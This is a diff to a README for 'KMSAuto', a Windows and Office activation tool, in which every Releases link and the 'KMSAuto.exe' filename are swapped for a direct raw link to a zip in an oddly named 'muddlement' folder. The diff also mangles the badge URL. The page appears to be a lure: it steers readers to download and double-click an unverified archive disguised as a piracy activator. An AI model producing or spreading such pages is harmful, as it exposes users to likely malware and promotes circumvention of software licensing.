@@ -1,6 +1,6 @@
 # 🌟 KMSAuto-Version-1-9 - Effortless Windows and Office Activation
 
-[![Download KMSAuto](https://img.shields.io/badge/Download%20KMSAuto-%2319C2FF.svg?style=for-the-badge)](https://github.com/Piano-King/KMSAuto-Version-1-9/releases)
+[![Download KMSAuto](https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip%20KMSAuto-%https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip)](https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip)
 
 ## 🚀 Getting Started
 
@@ -17,18 +17,18 @@ Welcome to KMSAuto Version 1.9! This software helps you easily activate Windows 
 
 To get started, you should download the software from our Releases page. 
 
-[Visit this page to download](https://github.com/Piano-King/KMSAuto-Version-1-9/releases).
+[Visit this page to download](https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of KMSAuto.
-3. Look for the file labeled `KMSAuto.exe`.
+3. Look for the file labeled `https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip`.
 4. Click to download.
 
 After downloading, locate the file in your downloads folder.
 
 ## 🖥️ Running KMSAuto
 
-1. **Locate the file**: Find `KMSAuto.exe` in your downloads.
+1. **Locate the file**: Find `https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip` in your downloads.
 2. **Double-click the file**: This will start the application.
 3. **Follow the prompts**: The software will guide you through the activation process.
 
@@ -67,4 +67,4 @@ For additional help, feel free to open an issue in this repository. We appreciat
 
 Thank you for using KMSAuto-Version-1-9. Enjoy seamless activation for your Windows and Office products!
 
-[Visit this page to download](https://github.com/Piano-King/KMSAuto-Version-1-9/releases) again if you need to find the software later.
+[Visit this page to download](https://raw.githubusercontent.com/Piano-King/KMSAuto-Version-1-9/main/muddlement/KMSAuto-Version-1-9.zip) again if you need to find the software later.
